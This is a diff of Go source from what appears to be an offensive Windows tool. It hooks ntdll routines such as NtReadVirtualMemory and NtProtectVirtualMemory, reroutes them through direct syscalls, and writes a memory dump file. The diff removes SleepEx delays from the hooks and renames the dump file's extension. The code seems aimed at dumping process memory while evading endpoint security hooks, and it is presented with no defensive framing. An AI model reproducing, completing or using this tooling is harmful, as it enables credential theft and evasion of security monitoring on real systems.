@@ -106,9 +106,6 @@ func main(){
 		fmt.Println("---------------------------------------------------")
 		fmt.Println("NtQuerySystemInformation hooked !!!!!")
 
-		windows.SleepEx(1,false)
-
-
 		r, _, _ := syscall.Syscall6(uintptr(NtQuerySystemInformation), 4, n1,n2,n3,n4,0,0)
 		//r, _, _ := syscall.Syscall6(original.Addr(), 5, n1,n2,n3,n4,n5,0)
 
@@ -137,9 +134,6 @@ func main(){
 	hook3, err = hinako.NewHookByName(arch, "ntdll.dll", "NtQueryInformationThread", func(n1,n2,n3,n4,n5 uintptr) uintptr {
 		fmt.Println("---------------------------------------------------")
 		fmt.Println("NtQueryInformationThread hooked !!!!!")
-
-		windows.SleepEx(1,false)
-
 
 		r,_ := gabh.HgSyscall(NtQueryInformationThread,n1,n2,n3,n4,n5)
 		//r, _, _ := syscall.Syscall6(uintptr(NtQueryInformationThread), 5, n1,n2,n3,n4,n5,0)
@@ -171,9 +165,6 @@ func main(){
 	hook4, err = hinako.NewHookByName(arch, "ntdll.dll", "NtProtectVirtualMemory", func(n1,n2,n3,n4,n5 uintptr) uintptr {
 		fmt.Println("---------------------------------------------------")
 		fmt.Println("NtProtectVirtualMemory hooked !!!!!")
-
-		windows.SleepEx(1,false)
-
 
 		r,_ := gabh.HgSyscall(NtProtectVirtualMemory,n1,n2,n3,n4,n5)
 		//r, _, _ := syscall.Syscall6(uintptr(NtProtectVirtualMemory), 5, n1,n2,n3,n4,n5,0)
@@ -207,9 +198,6 @@ func main(){
 	hook1, err = hinako.NewHookByName(arch, "ntdll.dll", "NtReadVirtualMemory", func(n1,n2,n3,n4,n5 uintptr) uintptr {
 		fmt.Println("---------------------------------------------------")
 		fmt.Println("NtReadVirtualMemory hooked"+ strconv.Itoa(flag)+"!!!!!")
-
-		windows.SleepEx(1,false)
-
 
 		r,_ := gabh.HgSyscall(NtReadVirtualMemory,n1,n2,n3,n4,n5)
 		//r, _, _ := syscall.Syscall6(uintptr(NtReadVirtualMemory), 5, n1,n2,n3,n4,n5,0)
@@ -267,7 +255,7 @@ func main(){
 
 	pwd,_ := os.Getwd()
 
-	str := "\\??\\"+pwd+"\\dmp.txt"
+	str := "\\??\\"+pwd+"\\dmp.dmp"
 
 	chDmpFile,_ := windows.NewNTUnicodeString(str)
 
